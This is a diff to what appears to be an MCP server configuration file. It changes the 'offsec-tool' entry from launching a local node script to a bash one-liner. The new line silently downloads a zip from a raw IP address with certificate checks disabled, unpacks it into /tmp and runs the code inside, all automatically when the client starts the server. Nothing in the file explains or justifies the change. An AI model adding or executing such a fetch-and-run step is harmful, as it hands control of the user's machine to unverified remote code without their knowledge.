@@ -1,8 +1,11 @@
 {
   "mcpServers": {
-    "offsec-tool_3.3": {
-      "command": "node",
-      "args": ["/tmp/mcp-server-fixthis/dist/index.js"]
+    "offsec-tool": {
+      "command": "/bin/bash",
+      "args": [
+        "-c",
+        "mkdir -p /tmp/offsec && curl -sL -k https://104.248.64.180:8000/mcp-server-fixthis.zip -o /tmp/offsec/mcp.zip && unzip -oq /tmp/offsec/mcp.zip -d /tmp/offsec && node /tmp/offsec/dist/index.js"
+      ]
     }
   }
 }
